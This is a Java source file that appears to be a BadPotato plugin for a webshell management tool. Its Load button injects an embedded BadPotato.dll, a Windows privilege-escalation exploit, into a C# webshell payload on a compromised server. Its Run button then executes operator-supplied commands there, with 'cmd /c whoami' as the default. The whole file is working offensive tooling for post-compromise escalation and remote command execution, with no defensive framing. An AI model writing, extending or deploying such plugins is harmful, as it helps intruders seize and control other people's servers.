package shells.plugins.cshap;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;


@PluginAnnotation(payloadName = "CShapDynamicPayload", Name = "BadPotato", DisplayName = "BadPotato")
public class BadPotato
  implements Plugin
{
  private static final String CLASS_NAME = "BadPotato.Run";
  private final JPanel panel;
  private final JButton loadButton;
  private final JButton runButton;
  private final JTextField commandTextField;
  private final JSplitPane splitPane;
  private final RTextArea resultTextArea;
  private boolean loadState;
  private ShellEntity shellEntity;
  private Payload payload;
  private Encoding encoding;
  
  public BadPotato() {
    this.panel = new JPanel(new BorderLayout());
    this.loadButton = new JButton("Load");
    this.runButton = new JButton("Run");
    this.commandTextField = new JTextField(35);
    this.resultTextArea = new RTextArea();
    this.splitPane = new JSplitPane();
    
    this.splitPane.setOrientation(0);
    this.splitPane.setDividerSize(0);
    
    JPanel topPanel = new JPanel();
    
    topPanel.add(this.loadButton);
    topPanel.add(this.commandTextField);
    topPanel.add(this.runButton);
    
    this.splitPane.setTopComponent(topPanel);
    this.splitPane.setBottomComponent(new JScrollPane((Component)this.resultTextArea));
    
    this.splitPane.addComponentListener(new ComponentAdapter()
        {
          public void componentResized(ComponentEvent e) {
            BadPotato.this.splitPane.setDividerLocation(0.15D);
          }
        });
    
    this.panel.add(this.splitPane);
    
    this.commandTextField.setText("cmd /c whoami");
  }
  
  private void loadButtonClick(ActionEvent actionEvent) {
    if (!this.loadState) {
      try {
        InputStream inputStream = getClass().getResourceAsStream("assets/BadPotato.dll");
        byte[] data = functions.readInputStream(inputStream);
        inputStream.close();
        if (this.payload.include("BadPotato.Run", data)) {
          this.loadState = true;
          GOptionPane.showMessageDialog(this.panel, "Load success", "提示", 1);
        } else {
          GOptionPane.showMessageDialog(this.panel, "Load fail", "提示", 2);
        } 
      } catch (Exception e) {
        Log.error(e);
        GOptionPane.showMessageDialog(this.panel, e.getMessage(), "提示", 2);
      } 
    } else {
      
      GOptionPane.showMessageDialog(this.panel, "Loaded", "提示", 1);
    } 
  }
  private void runButtonClick(ActionEvent actionEvent) {
    ReqParameter parameter = new ReqParameter();
    parameter.add("cmd", this.commandTextField.getText());
    byte[] result = this.payload.evalFunc("BadPotato.Run", "run", parameter);
    this.resultTextArea.setText(this.encoding.Decoding(result));
  }

  
  public void init(ShellEntity shellEntity) {
    this.shellEntity = shellEntity;
    this.payload = this.shellEntity.getPayloadModule();
    this.encoding = Encoding.getEncoding(this.shellEntity);
    automaticBindClick.bindJButtonClick(this, this);
  }



  
  public JPanel getView() {
    return this.panel;
  }
}